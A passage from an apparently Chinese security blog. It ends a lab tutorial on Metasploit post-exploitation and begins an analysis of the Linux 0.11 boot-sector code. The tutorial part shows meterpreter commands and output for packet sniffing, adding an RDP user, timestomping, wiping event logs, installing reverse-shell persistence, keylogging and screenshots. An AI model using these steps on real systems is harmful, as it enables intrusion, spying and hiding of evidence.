title="0x07搜索文件"></a>0x07搜索文件</h2><p>在awd攻防赛的时候很好用<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f *flag*</span><br><span class="line">Found 3 results...</span><br><span class="line">    c:\flag.txt (39 bytes)</span><br><span class="line">    c:\Users\administrator.TEST\AppData\Roaming\Microsoft\Windows\Recent\flag.txt.lnk (477 bytes)</span><br><span class="line">    c:\Users\Administrator.ZGC-20160413JJL\AppData\Roaming\Microsoft\Windows\Recent\flag.txt.lnk (477 bytes)</span><br></pre></td></tr></table></figure><p></p><h2 id="0x08抓包"><a href="#0x08抓包" class="headerlink" title="0x08抓包"></a>0x08抓包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use sniffer</span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Sniffer Commands</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">    Command             Description</span><br><span class="line">    -------             -----------</span><br><span class="line">    sniffer_dump        Retrieve captured packet data to PCAP file</span><br><span class="line">    sniffer_interfaces  Enumerate all sniffable network interfaces</span><br><span class="line">    sniffer_release     Free captured packets on a specific interface instead of downloading them</span><br><span class="line">    sniffer_start       Start packet capture on a specific interface</span><br><span class="line">    sniffer_stats       View statistics of an active capture</span><br><span class="line">    sniffer_stop        Stop packet capture on a specific interface</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_interfaces</span><br><span class="line"></span><br><span class="line">1 - &apos;WAN Miniport (Network Monitor)&apos; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )</span><br><span class="line">2 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )</span><br><span class="line">3 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )</span><br><span class="line">4 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )</span><br><span class="line">5 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_start 5</span><br><span class="line">[*] Capture started on interface 5 (50000 packet buffer)</span><br><span class="line">meterpreter &gt; sniffer_dump 5 /tmp/1.pcap</span><br><span class="line">[*] Flushing packet capture buffer for interface 5...</span><br><span class="line">[*] Flushed 2540 packets (1450560 bytes)</span><br><span class="line">[*] Downloaded 036% (524288/1450560)...</span><br><span class="line">[*] Downloaded 072% (1048576/1450560)...</span><br><span class="line">[*] Downloaded 100% (1450560/1450560)...</span><br><span class="line">[*] Download completed, converting to PCAP...</span><br><span class="line">[*] PCAP file written to /tmp/1.pcap</span><br><span class="line">meterpreter &gt; sniffer_stop 5</span><br><span class="line">[*] Capture stopped on interface 5</span><br><span class="line">[*] There are 29 packets (2263 bytes) remaining</span><br><span class="line">[*] Download or release them using &apos;sniffer_dump&apos; or &apos;sniffer_release&apos;</span><br></pre></td></tr></table></figure><h2 id="0x09开启3389"><a href="#0x09开启3389" class="headerlink" title="0x09开启3389"></a>0x09开启3389</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run getgui -u haha -p password</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.</span><br><span class="line">[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]</span><br><span class="line">[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator</span><br><span class="line">[*] Carlos Perez carlos_perez@darkoperator.com</span><br><span class="line">[*] Setting user account for logon</span><br><span class="line">[*] 	Adding User: haha with Password: password</span><br><span class="line">[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rc</span><br><span class="line">meterpreter &gt; run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rc</span><br></pre></td></tr></table></figure><p>会新建个账号，并在后面删掉</p><h2 id="0x0A改变文件时间"><a href="#0x0A改变文件时间" class="headerlink" title="0x0A改变文件时间"></a>0x0A改变文件时间</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Usage: timestomp &lt;file(s)&gt; OPTIONS</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -a &lt;opt&gt;  Set the &quot;last accessed&quot; time of the file</span><br><span class="line">    -b        Set the MACE timestamps so that EnCase shows blanks</span><br><span class="line">    -c &lt;opt&gt;  Set the &quot;creation&quot; time of the file</span><br><span class="line">    -e &lt;opt&gt;  Set the &quot;mft entry modified&quot; time of the file</span><br><span class="line">    -f &lt;opt&gt;  Set the MACE of attributes equal to the supplied file</span><br><span class="line">    -h        Help banner</span><br><span class="line">    -m &lt;opt&gt;  Set the &quot;last written&quot; time of the file</span><br><span class="line">    -r        Set the MACE timestamps recursively on a directory</span><br><span class="line">    -v        Display the UTC MACE values of the file</span><br><span class="line">    -z &lt;opt&gt;  Set all four attributes (MACE) of the file</span><br><span class="line"></span><br><span class="line">meterpreter &gt; timestomp -v flag.txt</span><br><span class="line">[*] Showing MACE attributes for flag.txt</span><br><span class="line">Modified      : 2017-02-22 14:55:50 +0800</span><br><span class="line">Accessed      : 2017-01-11 20:53:57 +0800</span><br><span class="line">Created       : 2017-01-11 20:53:57 +0800</span><br><span class="line">Entry Modified: 2017-02-22 14:55:50 +0800</span><br><span class="line">meterpreter &gt; timestomp -v 1.txt</span><br><span class="line">[*] Showing MACE attributes for 1.txt</span><br><span class="line">Modified      : 2018-03-19 20:13:36 +0800</span><br><span class="line">Accessed      : 2018-03-19 21:41:24 +0800</span><br><span class="line">Created       : 2018-03-19 21:41:24 +0800</span><br><span class="line">Entry Modified: 2018-03-19 21:41:24 +0800</span><br><span class="line">meterpreter &gt; timestomp 1.txt -f flag.txt</span><br><span class="line">[*] Pulling MACE attributes from flag.txt</span><br><span class="line">[*] Setting specific MACE attributes on 1.txt</span><br><span class="line">meterpreter &gt; timestomp -v 1.txt</span><br><span class="line">[*] Showing MACE attributes for 1.txt</span><br><span class="line">Modified      : 2017-02-22 14:55:50 +0800</span><br><span class="line">Accessed      : 2017-01-11 20:53:57 +0800</span><br><span class="line">Created       : 2017-01-11 20:53:57 +0800</span><br><span class="line">Entry Modified: 2017-02-22 14:55:50 +0800</span><br></pre></td></tr></table></figure><h2 id="0x0B日志清除"><a href="#0x0B日志清除" class="headerlink" title="0x0B日志清除"></a>0x0B日志清除</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line">[*] Wiping 1692 records from Application...</span><br><span class="line">[*] Wiping 6855 records from System...</span><br><span class="line">[*] Wiping 2664 records from Security...</span><br></pre></td></tr></table></figure><h2 id="0X0C留后门"><a href="#0X0C留后门" class="headerlink" title="0X0C留后门"></a>0X0C留后门</h2><ol><li>Metsvc(通过服务安装)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~1.TES\AppData\Local\Temp\ENDPAzIy...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">	 * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure><p>这个时候我们去连接它</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; set payload windows/metsvc_bind_tcp</span><br><span class="line">payload =&gt; windows/metsvc_bind_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set rhost 192.168.161.132</span><br><span class="line">rhost =&gt; 192.168.161.132</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 31337</span><br><span class="line">lport =&gt; 31337</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] 192.168.161.132 - Meterpreter session 6 closed.  Reason: Died</span><br><span class="line">[*] Meterpreter session 6 opened (127.0.0.1 -&gt; 127.0.0.1) at 2018-03-19 21:37:23 +0800</span><br></pre></td></tr></table></figure><ol><li>persistence(通过自启动安装)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -U -i 5 -p 443 -r 192.168.161.138</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/TOPSEC_20180319.1312/TOPSEC_20180319.1312.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.161.138 LPORT=443</span><br><span class="line">[*] Persistent agent script is 99606 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~1.TES\AppData\Local\Temp\xdoxmsHr.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~1.TES\AppData\Local\Temp\xdoxmsHr.vbs</span><br><span class="line">[+] Agent executed with PID 3528</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\jQiyGnPRxgnllmr</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\jQiyGnPRxgnllmr</span><br></pre></td></tr></table></figure><p>然后重启试下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; </span><br><span class="line">[*] 192.168.161.132 - Meterpreter session 4 closed.  Reason: Died</span><br><span class="line">msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.161.132</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.161.138:443 -&gt; 192.168.161.132:49169) at 2018-03-19 21:18:07 +0800</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                  Connection</span><br><span class="line">  --  ----  ----                     -----------                  ----------</span><br><span class="line">  5         meterpreter x86/windows  TEST\Administrator @ TOPSEC  192.168.161.138:443 -&gt; 192.168.161.132:49169 (192.168.161.132)</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; sessions -i 5</span><br><span class="line">[*] Starting interaction with 5...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p></p><p>会留一个后门，并添加进启动项</p><h2 id="0X0D键盘记录"><a href="#0X0D键盘记录" class="headerlink" title="0X0D键盘记录"></a>0X0D键盘记录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">mima&lt;Shift&gt;&lt;Right Shift&gt;:12345679&lt;^S&gt;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure><h2 id="0X0E进程注入"><a href="#0X0E进程注入" class="headerlink" title="0X0E进程注入"></a>0X0E进程注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]                                                </span><br><span class="line"> 4     0     System             x86   0                                      </span><br><span class="line"> 232   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe</span><br><span class="line"> 320   312   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\csrss.exe</span><br><span class="line"> 368   480   msdtc.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\windows\System32\msdtc.exe</span><br><span class="line"> 372   312   wininit.exe        x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\wininit.exe</span><br><span class="line"> 384   364   csrss.exe          x86   1        NT AUTHORITY\SYSTEM           C:\windows\system32\csrss.exe</span><br><span class="line"> 432   364   winlogon.exe       x86   1        NT AUTHORITY\SYSTEM           C:\windows\system32\winlogon.exe</span><br><span class="line"> 480   372   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\services.exe</span><br><span class="line"> 488   372   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\windows\system32\lsass.exe</span><br><span class="line">...</span><br><span class="line">meterpreter &gt; migrate 3104</span><br><span class="line">[*] Migrating to 3104</span><br></pre></td></tr></table></figure><h2 id="0x0F-截屏"><a href="#0x0F-截屏" class="headerlink" title="0x0F 截屏"></a>0x0F 截屏</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eterpreter &gt; use espia</span><br><span class="line">Loading extension espia...Success.</span><br><span class="line">meterpreter &gt; screen</span><br><span class="line">screengrab  screenshot  </span><br><span class="line">meterpreter &gt; screengrab </span><br><span class="line">Screenshot saved to: /home/daiker/zQBKZbTv.jpeg</span><br></pre></td></tr></table></figure></div><footer class="article-footer"><a data-url="https://www.daikersec.com/post/9668f403.html" data-id="cjh7qn8jb000qvdxv4la509uw" class="article-share-link" data-share="baidu" data-title="metasploit在后渗透中的作用">分享到</a></footer></div></article><article id="post-Linuxv0.11源码分析之引导启动程序一" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/post/b309a0f3.html" class="article-date"><time datetime="2018-03-19T05:16:28.000Z" itemprop="datePublished">2018-03-19</time></a></div><div class="article-inner"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/post/b309a0f3.html">Linuxv0.11源码分析之引导启动程序一</a></h1></header><div class="article-entry" itemprop="articleBody"><h2 id="0x00-大体流程"><a href="#0x00-大体流程" class="headerlink" title="0x00 大体流程"></a>0x00 大体流程</h2><p>这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，<br>最后将程序的控制权交给<code>setup.s</code></p><h2 id="0x01-bios做了什么"><a href="#0x01-bios做了什么" class="headerlink" title="0x01 bios做了什么"></a>0x01 bios做了什么</h2><p>按下电源键的时候，CPU硬件逻辑设计为强行将CS的值置为0F000,IP的值置为0xFFF0,这样CS：IP就指向0xFFFF0这个地址位置。<br>而bios的入口地址就设计在这个位置。这个时候bios开始运行。bios会读取并检测显卡，内存等电脑硬件。<br>接下来bios会在内存中加载向量表和终端服务程序。此时内存的信息如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00000-0x003FF 中断向量表(1kb)</span><br><span class="line">0x00400-0x004FF BIOS数据区(256b)</span><br><span class="line">....</span><br><span class="line">57kb以后-xxxx(8kb)的终端服务程序</span><br></pre></td></tr></table></figure><p></p><p>接下来bios会触发0x19中断<br>这个中断对应的中断服务程序的功能是将0号磁头对应盘面的0磁道1扇区的内容(共512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR）)复制至内存<code>0x07C00</code>处</p><h2 id="0x02-将随后的4个扇区加载进内存"><a href="#0x02-将随后的4个扇区加载进内存" class="headerlink" title="0x02 将随后的4个扇区加载进内存"></a>0x02 将随后的4个扇区加载进内存</h2><p>从入口开始看<br><code>boot/bootsect.s</code><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">entry _start</span><br><span class="line">_start:</span><br><span class="line">	mov	ax,#BOOTSEG</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	mov	ax,#INITSEG</span><br><span class="line">	mov	es,ax</span><br><span class="line">	mov	cx,#256</span><br><span class="line">	sub	si,si</span><br><span class="line">	sub	di,di</span><br><span class="line">	rep</span><br><span class="line">	movw !bootsec</span><br></pre></td></tr></table></figure><p></p><p>这段代码是含义是将<code>BOOTSEG</code>后面512个字节移到<code>INITSEG</code>后面的512个字节<br>然后看下<code>BOOTSEG</code>和<code>INITSEG</code>的定义<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BOOTSEG  = 0x07c0			! 启动扇区被BIOS加载的位置</span><br><span class="line">INITSEG  = 0x9000			! 启动扇区将移动到的新位置</span><br></pre></td></tr></table></figure><p></p><p>也就是说我们在前一步通过bios加载进内存的512字节，一开始会先把自己512字节内容由0x07c00复制到0x90000处<br>接下来<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmpi	go,INITSEG !跳转到0x90000处继续执行</span><br></pre></td></tr></table></figure><p></p><p>这里jmpi的格式是<code>jmpi ip,cs</code>。如果没有这一步，程序接下来会执行0x07C00为开始的那一段的go处。<br>但是这里跳转到0x90000开始的那一段内存的go处。跳转到复制完的地方执行。<br>接下来继续看<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">go:	mov	ax,cs</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	mov	es,ax</span><br><span class="line">	! put stack at 0x9ff00.</span><br><span class="line">	mov	ss,ax</span><br><span class="line">	mov	sp,#0xFF00		! arbitrary value &gt;&gt;512</span><br></pre></td></tr></table></figure><p></p><p>前面已经改变了cs，现在对ds，es，sp的值进行设置<br>继续看<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load_setup:</span><br><span class="line">	mov	dx,#0x0000		! drive 0, head 0</span><br><span class="line">	mov	cx,#0x0002		! sector 2, track 0</span><br><span class="line">	mov	bx,#0x0200		! address = 512, in INITSEG</span><br><span class="line">	mov	ax,#0x0200+SETUPLEN	! service 2, nr of sectors</span><br><span class="line">	int	0x13			! read it</span><br></pre></td></tr></table></figure><p></p><p>首先查下bios的0x13中断是什么意思<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8e0e5dcf8d244507.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="BIOS中断表"><br>对应表格查阅，可以看出这几行代码的意思是把从第二个扇区开始的4个扇区(即setup.s，在boot/setup.s里面)读进内存es:bx处，<br>即0x90200处。前面说到第一个扇区的内存被复制到0x90000处，0x90200离0x90000有256字节，刚好是第一个扇区的长度。<br>也就是说第一个扇区和第二个扇区相邻。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jnc	ok_load_setup		! ok - continue</span><br><span class="line">	mov	dx,#0x0000</span><br><span class="line">	mov	ax,#0x0000		! reset the diskette</span><br><span class="line">	int	0x13</span><br><span class="line">	j	load_setup</span><br></pre></td></tr></table></figure><p>这段代码是判断是否成功，没有成功的话，系统复位之后再重新读一次。</p><h2 id="0x03-将后面的240个扇区加载进内存"><a href="#0x03-将后面的240个扇区加载进内存" class="headerlink" title="0x03 将后面的240个扇区加载进内存"></a>0x03 将后面的240个扇区加载进内存</h2><p>接下来我们将第三批程序载入内存<br>从105行开始<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">! ok, we&apos;ve written the message, now</span><br><span class="line">! we want to load the system (at 0x10000)</span><br><span class="line"></span><br><span class="line">	mov	ax,#SYSSEG</span><br><span class="line">	mov	es,ax		! segment of 0x010000</span><br><span class="line">	call	read_it</span><br><span class="line">	call	kill_motor</span><br></pre></td></tr></table></figure><p></p><p>这段代码的功能和载入setup.s一样，，只不过载入setup.s只有四个扇区，这段代码足足占了240个扇区。花的时间比较长，<br>为了防止用户以为机器故障，linus加了一个输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov	ah,#0x03		! read cursor pos</span><br><span class="line">xor	bh,bh</span><br><span class="line">int	0x10</span><br><span class="line"></span><br><span class="line">mov	cx,#24</span><br><span class="line">mov	bx,#0x0007		! page 0, attribute 7 (normal)</span><br><span class="line">mov	bp,#msg1</span><br><span class="line">mov	ax,#0x1301		! write string, move cursor</span><br><span class="line">int	0x10</span><br></pre></td></tr></table></figure><p>调用0x10中断输出<code>Loading system ...</code><br>看下0x10中断的内容<br><img src="https://upload-images.jianshu.io/upload_images/5443560-e41ee43275a295b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>下面我们来具体看下这240个扇区怎么载入的</p><p>我们先看下<code>read_it</code>子模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">read_it:</span><br><span class="line">	mov ax,es</span><br><span class="line">	test ax,#0x0fff</span><br><span class="line">die:	jne die			! 确保es必须是64kb</span><br><span class="line">	xor bx,bx		!清空bx,使得bs可以被用作段内基址</span><br><span class="line">rp_read:</span><br><span class="line">	mov ax,es</span><br><span class="line">	cmp ax,#ENDSEG		! have we loaded all yet?</span><br><span class="line">	jb ok1_read</span><br><span class="line">	ret</span><br><span class="line">ok1_read:</span><br><span class="line">	seg cs</span><br><span class="line">	mov ax,sectors</span><br><span class="line">	sub ax,sread</span><br><span class="line">	mov cx,ax</span><br><span class="line">	shl cx,#9</span><br><span class="line">	add cx,bx</span><br><span class="line">	jnc ok2_read</span><br><span class="line">	je ok2_read</span><br><span class="line">	xor ax,ax</span><br><span class="line">	sub ax,bx</span><br><span class="line">	shr ax,#9</span><br><span class="line">ok2_read:</span><br><span class="line">	call read_track</span><br><span class="line">	mov cx,ax</span><br><span class="line">	add ax,sread</span><br><span class="line">	seg cs</span><br><span class="line">	cmp ax,sectors</span><br><span class="line">	jne ok3_read</span><br><span class="line">	mov ax,#1</span><br><span class="line">	sub ax,head</span><br><span class="line">	jne ok4_read</span><br><span class="line">	inc track</span><br><span class="line">ok4_read:</span><br><span class="line">	mov head,ax</span><br><span class="line">	xor ax,ax</span><br><span class="line">ok3_read:</span><br><span class="line">	mov sread,ax</span><br><span class="line">	shl 